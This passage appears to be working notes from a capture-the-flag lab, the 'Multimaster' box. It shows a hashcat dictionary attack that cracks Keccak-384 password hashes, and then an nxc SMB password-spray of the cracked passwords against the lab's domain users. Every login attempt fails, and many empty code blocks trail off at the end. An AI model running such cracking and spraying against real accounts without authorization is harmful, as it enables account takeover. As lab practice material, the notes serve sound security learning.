└─$ sudo hashcat -m 17900 sha384_uniq.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

/usr/share/hashcat/OpenCL/m17900_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

/usr/share/hashcat/OpenCL/m17900_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 4 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Salt
* Raw-Hash
* Uses-64-Bit

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (25842 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 17900 (Keccak-384)
Hash.Target......: sha384_uniq.txt
Time.Started.....: Sun Sep 27 03:00:17 2026 (3 secs)
Time.Estimated...: Sun Sep 27 03:00:20 2026 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  5552.6 kH/s (0.59ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 3/4 (75.00%) Digests (total), 3/4 (75.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 3094/14344385 (0.02%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !jonaluz28! -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 42%

Started: Sun Sep 27 03:00:08 2026
Stopped: Sun Sep 27 03:00:20 2026
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster/Users]
└─$ cat users.txt
sbauer
shayna
james
cyork
jorden
aldom
ckane
kpage
zac
ilee
zpowers
okent
rmartin
alyx
nbourne
┌──(kali㉿kali)-[~/Work/Kali/Multimaster/Users]
└─$ cat pass.txt
password1
password1
password1
password1
password1
password1
finance1
finance1
finance1
finance1
finance1
banking1
banking1
banking1
banking1
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster/Users]
└─$ nxc smb 10.129.95.200 -u users.txt -p pass.txt --no-bruteforce --continue-on-success -d MEGACORP.LOCAL
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\james:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\cyork:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\zac:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:banking1 STATUS_LOGON_FAILURE
```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```